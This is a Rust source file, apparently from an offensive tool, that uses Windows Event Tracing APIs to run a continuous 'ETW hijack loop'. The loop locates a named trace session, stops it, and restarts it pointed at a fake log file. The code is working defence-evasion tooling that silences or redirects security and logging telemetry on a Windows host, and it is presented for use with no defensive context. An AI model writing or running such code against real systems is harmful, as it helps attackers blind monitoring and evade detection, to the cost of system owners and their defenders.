use std::mem::{size_of, zeroed};
use std::ptr::null_mut;
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use log::{debug, info, warn};
use windows_sys::Win32::Foundation::{ERROR_SUCCESS, ERROR_WMI_INSTANCE_NOT_FOUND};
use windows_sys::Win32::System::Diagnostics::Etw::{
    CONTROLTRACE_HANDLE, EVENT_TRACE_PROPERTIES, QueryAllTracesW, QueryTraceW, StartTraceW,
    StopTraceW, EVENT_TRACE_FILE_MODE_SEQUENTIAL, EVENT_TRACE_REAL_TIME_MODE, WNODE_FLAG_TRACED_GUID,
};

use crate::errors::EtwError;
use crate::wide::{to_wide_null, wide_ptr_eq};

/// Maximum UTF-16 code units reserved for session and file name buffers.
const MAXSTR: usize = 1024;
/// Maximum number of concurrent ETW sessions that can be enumerated.
const MAXIMUM_LOGGERS: usize = 64;
/// Delay (in milliseconds) between control retries when operations fail.
const SLEEP_MS: u64 = 750;

/// Controls and manipulates an existing ETW (Event Tracing for Windows) session.
///
/// The controller repeatedly attempts to hijack a target ETW session and restart it
/// under a specified fake log file. It is designed for continuous operation and
/// does not maintain internal mutable state beyond immutable configuration.
#[derive(Clone)]
pub struct EtwController {
    session: Arc<String>,
    fake_log_file: Arc<String>,
}

impl EtwController {
    /// Creates a new ETW controller for the given session name and fake log file path.
    ///
    /// Returns an [`EtwError`] if either argument is empty.
    pub fn new(session: String, fake_log_file: String) -> Result<Self, EtwError> {
        if session.is_empty() {
            return Err(EtwError::Internal("session name is empty".into()));
        }
        if fake_log_file.is_empty() {
            return Err(EtwError::Internal("fake log file path is empty".into()));
        }
        Ok(Self {
            session: Arc::new(session),
            fake_log_file: Arc::new(fake_log_file),
        })
    }

    /// Starts the hijack loop on the current thread.
    ///
    /// This continuously:
    /// 1. Checks if the target ETW session exists.
    /// 2. Stops it if found.
    /// 3. Restarts it with the fake log file.
    ///
    /// The loop runs indefinitely, sleeping between attempts.
    pub fn run_loop(&self) {
        let session = &*self.session;
        let fake_log_file = &*self.fake_log_file;

        info!(
            "Starting ETW hijack loop for session='{session}' with fake_log_file='{fake_log_file}'"
        );

        // Pre-encode UTF-16 strings once to reuse buffers across iterations.
        let session_w = to_wide_null(session);
        let fake_w = to_wide_null(fake_log_file);

        loop {
            // Try to locate an existing ETW session.
            match query_session_handle(session) {
                Ok(Some(handle)) => {
                    debug!("Found session handle: {:#x}", handle.Value);

                    if let Err(e) = stop_trace(handle, &session_w) {
                        warn!("StopTraceW failed: {e}");
                        thread::sleep(Duration::from_millis(SLEEP_MS));
                        continue;
                    }
                    info!("Stopped existing session");
                }
                Ok(None) => {
                    debug!("Session not found");
                }
                Err(e) => {
                    warn!("Failed to query session: {e}");
                    thread::sleep(Duration::from_millis(SLEEP_MS));
                    continue;
                }
            }

            // Attempt to restart the session with the fake log file.
            if let Err(e) = start_trace_with_file(&session_w, &fake_w) {
                warn!("StartTraceW failed: {e}");
                thread::sleep(Duration::from_millis(SLEEP_MS));
                continue;
            }

            info!("Session restarted under fake file");
            thread::sleep(Duration::from_millis(SLEEP_MS));
        }
    }
}

/// Resolves the handle of an existing ETW session by name.
///
/// Tries `QueryTraceW` first for a direct lookup.
/// If that fails with `ERROR_WMI_INSTANCE_NOT_FOUND`, falls back to enumerating all active sessions.
fn query_session_handle(session: &str) -> Result<Option<CONTROLTRACE_HANDLE>, EtwError> {
    let session_w = to_wide_null(session);

    match query_trace_direct(&session_w) {
        Ok(Some(h)) => return Ok(Some(h)),
        Ok(None) => {} // Not found, try full enumeration next
        Err(e) => {
            if !is_instance_not_found(&e) {
                return Err(e);
            }
        }
    }

    query_trace_enumerate_by_name(session)
}

/// Directly queries a session by name using `QueryTraceW`.
///
/// If found, returns its control handle via the `Wnode.HistoricalContext` field.
fn query_trace_direct(session_w: &[u16]) -> Result<Option<CONTROLTRACE_HANDLE>, EtwError> {
    let (_buf, props) = make_properties_buffers(Some(session_w), None);
    unsafe {
        (*props).Wnode.Flags = WNODE_FLAG_TRACED_GUID;
    }

    let status = unsafe { QueryTraceW(CONTROLTRACE_HANDLE::default(), session_w.as_ptr(), props) };

    match status {
        s if s == ERROR_SUCCESS => {
            let handle = unsafe { (*props).Wnode.Anonymous1.HistoricalContext };
            Ok(Some(CONTROLTRACE_HANDLE { Value: handle }))
        }
        s if s == ERROR_WMI_INSTANCE_NOT_FOUND => Ok(None),
        s => Err(EtwError::from_winapi(s as i32, "QueryTraceW")),
    }
}

/// Enumerates all running ETW sessions using `QueryAllTracesW` and returns
/// the handle of the one matching the specified name, if any.
fn query_trace_enumerate_by_name(session: &str) -> Result<Option<CONTROLTRACE_HANDLE>, EtwError> {
    let mut props_ptrs: Vec<*mut EVENT_TRACE_PROPERTIES> =
        (0..MAXIMUM_LOGGERS).map(|_| null_mut()).collect();

    // Allocate independent buffers for each entry so the pointers remain valid.
    let mut backing: Vec<Vec<u8>> = Vec::with_capacity(MAXIMUM_LOGGERS);
    for slot in &mut props_ptrs {
        let (buf, props) = make_properties_buffers(None, None);
        *slot = props;
        backing.push(buf);
    }

    let mut logger_count: u32 = 0;
    let status =
        unsafe { QueryAllTracesW(props_ptrs.as_mut_ptr(), MAXIMUM_LOGGERS as u32, &mut logger_count) };
    if status != ERROR_SUCCESS {
        return Err(EtwError::from_winapi(status as i32, "QueryAllTracesW"));
    }

    // Iterate through the results and compare the session name.
    for i in 0..(logger_count as usize) {
        let props = props_ptrs[i];
        let (logger_name_ptr, _) = unsafe { extract_name_pointers(props) };

        let is_match = unsafe { wide_ptr_eq(logger_name_ptr, session) };
        if is_match {
            let handle = unsafe { (*props).Wnode.Anonymous1.HistoricalContext };
            return Ok(Some(CONTROLTRACE_HANDLE { Value: handle }));
        }
    }

    Ok(None)
}

/// Stops an ETW session using its control handle.
fn stop_trace(handle: CONTROLTRACE_HANDLE, session_w: &[u16]) -> Result<(), EtwError> {
    let (_buf, props) = make_properties_buffers(Some(session_w), None);
    unsafe {
        (*props).Wnode.Flags = WNODE_FLAG_TRACED_GUID;
    }

    let status = unsafe { StopTraceW(handle, session_w.as_ptr(), props) };
    if status == ERROR_SUCCESS {
        Ok(())
    } else {
        Err(EtwError::from_winapi(status as i32, "StopTraceW"))
    }
}

/// Starts (or recreates) a session pointing to a fake log file.
///
/// The session is configured in **sequential** + **real-time** mode,
/// simulating a live trace while redirecting output.
fn start_trace_with_file(session_w: &[u16], fake_w: &[u16]) -> Result<(), EtwError> {
    let (_buf, props) = make_properties_buffers(Some(session_w), Some(fake_w));

    unsafe {
        (*props).Wnode.Flags = WNODE_FLAG_TRACED_GUID;
        (*props).LogFileMode = EVENT_TRACE_FILE_MODE_SEQUENTIAL | EVENT_TRACE_REAL_TIME_MODE;
    }

    let mut handle = CONTROLTRACE_HANDLE::default();
    let status = unsafe { StartTraceW(&mut handle as *mut _, session_w.as_ptr(), props) };

    if status == ERROR_SUCCESS {
        Ok(())
    } else {
        Err(EtwError::from_winapi(status as i32, "StartTraceW"))
    }
}

/// Checks whether an [`EtwError`] corresponds to `ERROR_WMI_INSTANCE_NOT_FOUND`.
fn is_instance_not_found(err: &EtwError) -> bool {
    match err {
        EtwError::WinApi { code, .. } => *code as u32 == ERROR_WMI_INSTANCE_NOT_FOUND,
        _ => false,
    }
}

/// Allocates and initializes a buffer for `EVENT_TRACE_PROPERTIES` plus trailing
/// UTF-16 storage for the session and log file names.
///
/// Memory layout:
/// ```text
/// [EVENT_TRACE_PROPERTIES][session name buffer][log file name buffer]
/// ```
///
/// Returns both the backing `Vec<u8>` (to ensure lifetime) and a pointer
/// to the properties structure at its start.
///
/// # Safety
/// The pointer remains valid as long as the returned vector is not dropped.
fn make_properties_buffers(
    session_w: Option<&[u16]>,
    logfile_w: Option<&[u16]>,
) -> (Vec<u8>, *mut EVENT_TRACE_PROPERTIES) {
    let props_size = size_of::<EVENT_TRACE_PROPERTIES>();
    let logger_bytes = MAXSTR * 2;
    let logfile_bytes = MAXSTR * 2;
    let total = props_size + logger_bytes + logfile_bytes;

    let mut storage = vec![0u8; total];
    let props = storage.as_mut_ptr() as *mut EVENT_TRACE_PROPERTIES;

    unsafe {
        *props = zeroed();
        (*props).Wnode.BufferSize = total as u32;
        (*props).LoggerNameOffset = props_size as u32;
        (*props).LogFileNameOffset = (props_size + logger_bytes) as u32;

        if let Some(name) = session_w {
            let dst = storage.as_mut_ptr().add((*props).LoggerNameOffset as usize) as *mut u16;
            write_wide(dst, name);
        }
        if let Some(file) = logfile_w {
            let dst = storage.as_mut_ptr().add((*props).LogFileNameOffset as usize) as *mut u16;
            write_wide(dst, file);
        }
    }

    (storage, props)
}

/// Extracts pointers to the UTF-16 session and log file name strings from
/// an `EVENT_TRACE_PROPERTIES` buffer.
///
/// # Safety
/// `props` must point to a properly structured buffer with valid offsets.
unsafe fn extract_name_pointers(
    props: *mut EVENT_TRACE_PROPERTIES,
) -> (*const u16, *const u16) {
    let base = props as *const u8;
    let logger = unsafe { base.add((*props).LoggerNameOffset as usize) as *const u16 };
    let logfile = unsafe { base.add((*props).LogFileNameOffset as usize) as *const u16 };
    (logger, logfile)
}

/// Copies a UTF-16 (null-terminated) slice into the destination buffer.
///
/// # Safety
/// `dst` must have enough space to hold all elements of `src`.
unsafe fn write_wide(dst: *mut u16, src: &[u16]) {
    for (i, &c) in src.iter().enumerate() {
        unsafe { *dst.add(i) = c; }
    }
}
